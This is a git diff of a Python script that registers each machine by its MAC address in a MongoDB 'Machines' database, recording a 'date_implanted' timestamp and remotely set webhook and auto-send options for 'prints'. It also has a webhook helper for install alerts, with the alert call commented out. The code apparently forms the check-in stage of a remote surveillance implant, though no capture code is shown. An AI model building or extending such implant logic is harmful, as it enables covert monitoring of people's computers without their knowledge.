@@ -5,34 +5,46 @@ import requests, uuid, os
 
 def main():
   client = connect_db()
-  machines_db = client['Machines']
-  wh_alerts = client['Ouroboros']['Ouroboros'].find_one({"webhook.wh_alerts": {"$exists": True}})
-  print(wh_alerts)
+  db_master = client['Ouroboros']
+  col_configs = db_master['Configs']
 
-  mac = get_mac_address()
-  add_machine(mac, machines_db)
+  db_machines = client['Machines']
 
-  webhook = os.getenv('TEST_WEBHOOK')
-  headers = {'Content-Type': 'application/json'}
-  '''
-  requests.post(webhook, headers=headers, json={
-    'content': f'Fresh install: {mac}'
-  })
-  '''
+  wh_alerts = col_configs.distinct('webhooks.wh_alerts')[0]
+  #wh_alerts = client['Ouroboros']['Ouroboros'].find_one({"webhook.wh_alerts": {"$exists": True}})
+
+  add_machine(db_machines)
+
+  #message(wh_alerts, f'Install: {mac}')
 
 def connect_db():
+  #TODO: Colocar URI fixa.
   load_dotenv()
   connection = os.getenv('MONGODB_URI')
   return MongoClient(connection)
 
-def add_machine(mac, machines_db):
-  if mac not in machines_db.list_collection_names():
-    print('Machine does not exist')
-    print('Adding Machine...')
-    machines_db[mac].insert_one(
+def message(webhook, message):
+  headers = {'Content-Type': 'application/json'}
+  requests.post(webhook, json={'content': message}, headers=headers)
+
+def add_machine(db_machines):
+  mac = get_mac_address()
+  if mac not in db_machines.list_collection_names():
+    db_machines[mac].insert_one(
       {
-        'date_implanted': datetime.now(),
-        'machine_mac': mac
+        'infos': {
+          'name': '',
+          'date_implanted': datetime.now(),
+          'machine_mac': mac
+        },
+
+        'configs': {
+          'prints': {
+            'webhook': '',
+            'auto_send' : False,
+            'delay': 5000
+          }
+        }
       }
     )
     print('Machine Added Sucessfully!')
